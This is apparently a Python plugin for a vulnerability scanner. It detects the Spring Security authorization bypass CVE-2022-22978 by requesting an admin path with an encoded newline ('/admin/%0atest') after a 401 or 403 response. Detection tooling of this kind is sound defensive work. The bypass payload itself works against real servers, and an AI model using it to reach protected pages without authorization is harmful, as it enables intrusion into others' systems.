# -*- coding:utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    base_url = '{}://{}:{}'.format(service, ip, port)

    try:
        r = await http_client(ip, port).get(base_url + '/admin/test', timeout=10)
        if r.status_code in [401, 403]:
            r = await http_client(ip, port).get(base_url + '/admin/%0atest', timeout=10)
            if r.status_code == 200:
                ret = {
                    'alert_group': 'Sprint Security Bypass(CVE-2022-22978)',
                    'affects': base_url,
                    'details': 'Sprint Security Bypass(CVE-2022-22978)\n\n' +
                               base_url + '/admin/%0atest\n\n' +
                               'Reference: https://nosec.org/home/detail/5006.html\n'
                }
                return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, task_msg={})
    run_plugin_test(scan)
